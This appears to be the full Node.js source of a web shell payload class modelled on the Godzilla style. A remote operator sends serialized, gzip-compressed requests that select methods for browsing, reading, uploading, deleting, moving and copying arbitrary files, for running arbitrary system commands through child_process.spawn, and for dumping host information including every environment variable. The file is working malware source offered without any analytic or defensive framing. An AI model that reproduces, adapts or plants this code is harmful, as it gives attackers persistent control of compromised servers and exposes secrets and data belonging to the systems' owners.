class Payload {
    constructor() {
        this.parameterMap = {};
        this.sessionMap = global.sessionMap || {};
        global.sessionMap = this.sessionMap;
        this.outputStream = null;
    }

    get(key) {
        try {
            const value = this.parameterMap[key];
            if (Buffer.isBuffer(value)) {
                return value.toString('utf8');
            }
            return value ? value.toString() : null;
        } catch (e) {
            return null;
        }
    }

    getByteArray(key) {
        try {
            const value = this.parameterMap[key];
            if (Buffer.isBuffer(value)) {
                return value;
            }
            return value ? Buffer.from(value) : null;
        } catch (e) {
            return null;
        }
    }

    intToBytes(num) {
        const bytes = Buffer.alloc(4);
        bytes.writeUInt32LE(num, 0);
        return bytes;
    }

    bytesToInt(bytes) {
        return bytes.readUInt32LE(0);
    }

    serialize(map) {
        const result = [];
        for (const key in map) {
            if (map.hasOwnProperty(key)) {
                result.push(Buffer.from(key));
                const value = map[key];
                if (Buffer.isBuffer(value)) {
                    result.push(Buffer.from([2]));
                    result.push(this.intToBytes(value.length));
                    result.push(value);
                } else if (typeof value === 'object' && value !== null) {
                    result.push(Buffer.from([1]));
                    const serialized = this.serialize(value);
                    result.push(this.intToBytes(serialized.length));
                    result.push(serialized);
                } else {
                    result.push(Buffer.from([2]));
                    const str = value ? value.toString() : 'NULL';
                    const strBytes = Buffer.from(str);
                    result.push(this.intToBytes(strBytes.length));
                    result.push(strBytes);
                }
            }
        }
        return Buffer.concat(result);
    }

    deserialize(data, useGzip) {
        const zlib = require('zlib');
        const map = {};
        let input = Buffer.from(data);

        if (useGzip) {
            try {
                input = zlib.gunzipSync(input);
            } catch (e) {
                return map;
            }
        }

        let pos = 0;
        const temp = [];

        while (pos < input.length) {
            if (input[pos] === 1) {
                pos++;
                const len = this.bytesToInt(input.slice(pos, pos + 4));
                pos += 4;
                const key = Buffer.concat(temp).toString('utf8');
                temp.length = 0;
                map[key] = this.deserialize(input.slice(pos, pos + len), false);
                pos += len;
            } else if (input[pos] === 2) {
                pos++;
                const len = this.bytesToInt(input.slice(pos, pos + 4));
                pos += 4;
                const key = Buffer.concat(temp).toString('utf8');
                temp.length = 0;
                map[key] = input.slice(pos, pos + len);
                pos += len;
            } else {
                temp.push(Buffer.from([input[pos]]));
                pos++;
            }
        }

        return map;
    }

    formatParameter(requestData) {
        this.parameterMap = this.deserialize(requestData, true);
    }

    test() {
        try {
            const sessionId = this.get('sessionId') || this.generateRandomString(16);
            if (!this.sessionMap[sessionId]) {
                this.sessionMap[sessionId] = { alive: true };
            }
            const result = { sessionId: sessionId };
            return Buffer.from(JSON.stringify(result));
        } catch (e) {
            return Buffer.from('ok');
        }
    }

    generateRandomString(length) {
        const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    getFile() {
        const fs = require('fs');
        const path = require('path');
        const dirName = this.get('dirName');
        const result = {};

        if (!dirName) {
            result.errMsg = 'No parameter dirName';
            return this.serialize(result);
        }

        try {
            const dirPath = path.resolve(dirName.trim());
            const stats = fs.statSync(dirPath);

            if (!stats.isDirectory()) {
                result.errMsg = 'dir does not exist';
                return this.serialize(result);
            }

            const files = fs.readdirSync(dirPath);
            const fileList = {};

            files.forEach((file, index) => {
                try {
                    const filePath = path.join(dirPath, file);
                    const fileStats = fs.statSync(filePath);
                    const fileInfo = {};
                    fileInfo['0'] = file;
                    fileInfo['1'] = fileStats.isDirectory() ? '0' : '1';
                    fileInfo['2'] = fileStats.mtime.toISOString().replace('T', ' ').substring(0, 19);
                    fileInfo['3'] = fileStats.size.toString();

                    let perms = '';
                    if ((fileStats.mode & parseInt('400', 8)) !== 0) perms += 'R';
                    if ((fileStats.mode & parseInt('200', 8)) !== 0) perms += 'W';
                    if ((fileStats.mode & parseInt('100', 8)) !== 0) perms += 'X';
                    fileInfo['4'] = perms || 'F';

                    fileList[index.toString()] = fileInfo;
                } catch (e) {
                    const fileInfo = {};
                    fileInfo.errMsg = e.message;
                    fileList[index.toString()] = fileInfo;
                }
            });

            result.count = files.length.toString();
            result.currentDir = dirPath + path.sep;
            Object.assign(result, fileList);
        } catch (e) {
            result.errMsg = 'Exception errMsg:' + e.message;
        }

        return this.serialize(result);
    }

    listFileRoot() {
        if (process.platform === 'win32') {
            return 'C:\\;D:\\;E:\\;';
        } else {
            return '/;';
        }
    }

    readFile() {
        const fs = require('fs');
        const path = require('path');
        const fileName = this.get('fileName');
        if (!fileName) {
            return Buffer.from('No parameter fileName');
        }

        try {
            const filePath = path.resolve(fileName);
            const stats = fs.statSync(filePath);

            if (!stats.isFile()) {
                return Buffer.from('file does not exist');
            }

            if (stats.size > 204800) {
                return Buffer.from('The file is too large, please use the large file to download');
            }

            return fs.readFileSync(filePath);
        } catch (e) {
            return Buffer.from(e.message);
        }
    }

    uploadFile() {
        const fs = require('fs');
        const path = require('path');
        const fileName = this.get('fileName');
        const fileValue = this.getByteArray('fileValue');

        if (!fileName || !fileValue) {
            return Buffer.from('No parameter fileName and fileValue');
        }

        try {
            const filePath = path.resolve(fileName);
            fs.writeFileSync(filePath, fileValue);
            return Buffer.from('ok');
        } catch (e) {
            return Buffer.from(e.message);
        }
    }

    deleteFile() {
        const path = require('path');
        const fileName = this.get('fileName');
        if (!fileName) {
            return Buffer.from('No parameter fileName');
        }

        try {
            if (fileName.startsWith('mem://')) {
                delete this.sessionMap[fileName];
                return Buffer.from('ok');
            }

            const filePath = path.resolve(fileName);
            this.deleteFiles(filePath);
            return Buffer.from('ok');
        } catch (e) {
            return Buffer.from('Exception errMsg:' + e.message);
        }
    }

    deleteFiles(filePath) {
        const fs = require('fs');
        const path = require('path');
        const stats = fs.statSync(filePath);
        if (stats.isDirectory()) {
            const files = fs.readdirSync(filePath);
            files.forEach(file => {
                this.deleteFiles(path.join(filePath, file));
            });
        }
        fs.unlinkSync(filePath);
    }

    moveFile() {
        const fs = require('fs');
        const path = require('path');
        const srcFileName = this.get('srcFileName');
        const destFileName = this.get('destFileName');

        if (!srcFileName || !destFileName) {
            return Buffer.from('No parameter srcFileName,destFileName');
        }

        try {
            const srcPath = path.resolve(srcFileName);
            const destPath = path.resolve(destFileName);

            if (!fs.existsSync(srcPath)) {
                return Buffer.from('The target does not exist');
            }

            fs.renameSync(srcPath, destPath);
            return Buffer.from('ok');
        } catch (e) {
            return Buffer.from('Exception errMsg:' + e.message);
        }
    }

    copyFile() {
        const fs = require('fs');
        const path = require('path');
        const srcFileName = this.get('srcFileName');
        const destFileName = this.get('destFileName');

        if (!srcFileName || !destFileName) {
            return Buffer.from('No parameter srcFileName,destFileName');
        }

        try {
            const srcPath = path.resolve(srcFileName);
            const destPath = path.resolve(destFileName);

            if (!fs.existsSync(srcPath)) {
                return Buffer.from('The target does not exist or is not a file');
            }

            fs.copyFileSync(srcPath, destPath);
            return Buffer.from('ok');
        } catch (e) {
            return Buffer.from(e.message);
        }
    }

    newFile() {
        const fs = require('fs');
        const path = require('path');
        const fileName = this.get('fileName');
        if (!fileName) {
            return Buffer.from('No parameter fileName');
        }

        try {
            const filePath = path.resolve(fileName);
            fs.writeFileSync(filePath, '');
            return Buffer.from('ok');
        } catch (e) {
            return Buffer.from('Exception errMsg:' + e.message);
        }
    }

    newDir() {
        const fs = require('fs');
        const path = require('path');
        const dirName = this.get('dirName');
        if (!dirName) {
            return Buffer.from('No parameter fileName');
        }

        try {
            const dirPath = path.resolve(dirName);
            fs.mkdirSync(dirPath, { recursive: true });
            return Buffer.from('ok');
        } catch (e) {
            return Buffer.from('Exception errMsg:' + e.message);
        }
    }

    execCommand() {
        const { spawn } = require('child_process');
        const argsCount = parseInt(this.get('argsCount') || '0');
        if (argsCount === 0) {
            return Buffer.from('No parameter argsCount');
        }

        const args = [];
        for (let i = 0; i < argsCount; i++) {
            const arg = this.get('arg-' + i);
            if (arg) {
                args.push(arg);
            }
        }

        return new Promise((resolve) => {
            const proc = spawn(args[0], args.slice(1));
            let stdout = Buffer.alloc(0);
            let stderr = Buffer.alloc(0);

            proc.stdout.on('data', (data) => {
                stdout = Buffer.concat([stdout, data]);
            });

            proc.stderr.on('data', (data) => {
                stderr = Buffer.concat([stderr, data]);
            });

            proc.on('close', (code) => {
                resolve(Buffer.concat([stdout, stderr]));
            });
        });
    }

    async getBasicsInfo() {
        let info = '';
        try {
            const fs = require('fs');
            const path = require('path');
            info += 'FileRoot : ' + this.listFileRoot() + '\n';
            info += 'CurrentDir : ' + process.cwd() + path.sep + '\n';
            info += 'CurrentUser : ' + (process.env.USER || process.env.USERNAME || 'unknown') + '\n';
            info += 'ProcessArch : ' + process.arch + '\n';
            info += 'TempDirectory : ' + (process.env.TMPDIR || process.env.TEMP || '/tmp') + path.sep + '\n';
            info += 'RealFile : ' + (typeof __dirname !== 'undefined' ? __dirname : '.') + path.sep + '\n';
            info += 'OsInfo : os.name: ' + process.platform + ' os.version: ' + process.version + ' os.arch: ' + process.arch + '\n';

            const os = require('os');
            const interfaces = os.networkInterfaces();
            const ips = [];
            for (const name in interfaces) {
                for (const iface of interfaces[name]) {
                    if (iface.family === 'IPv4') {
                        ips.push(iface.address);
                    }
                }
            }
            info += 'IPList : [' + ips.join(',') + ']\n';

            for (const key in process.env) {
                info += key + ' : ' + process.env[key] + '\n';
            }
        } catch (e) {
            info += 'Exception errMsg:' + e.message + '\n';
        }
        return Buffer.from(info);
    }

    async run() {
        try {
            const methodName = this.get('methodName');
            if (!methodName) {
                return Buffer.from('Method is empty');
            }

            if (typeof this[methodName] === 'function') {
                const result = this[methodName]();
                if (result instanceof Promise) {
                    return await result;
                }
                return result || Buffer.from('');
            } else {
                return Buffer.from('No Such Method');
            }
        } catch (e) {
            return Buffer.from(e.stack || e.message);
        }
    }
}

